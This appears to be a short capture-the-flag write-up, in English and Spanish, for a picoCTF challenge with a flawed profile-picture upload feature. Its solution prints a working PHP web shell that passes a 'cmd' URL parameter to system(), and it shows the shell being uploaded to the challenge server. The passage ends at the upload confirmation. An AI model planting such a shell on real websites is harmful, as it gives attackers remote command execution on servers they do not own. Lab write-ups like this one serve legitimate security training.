A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the `/root` directory.

## Solucion

Se ingresa a la página. Se hace el siguiente script: upload.php

```
<?php  
if ( isset ( $_GET [ 'cmd' ])){  
echo "<pre>" ;  
$cmd = $_GET [ 'cmd' ]; // Obtener el comando de la cadena de consulta  
system ( $cmd ); // Ejecutar el comando y mostrar la salida  
echo "</pre>" ;  
}  
?>
```

Lo subimos a la pagina y en la url agregamos  /upload.php:
http://standard-pizzas.picoctf.net:58213/upload.php
The file upload.php has been uploaded Path: uploads/upload.php
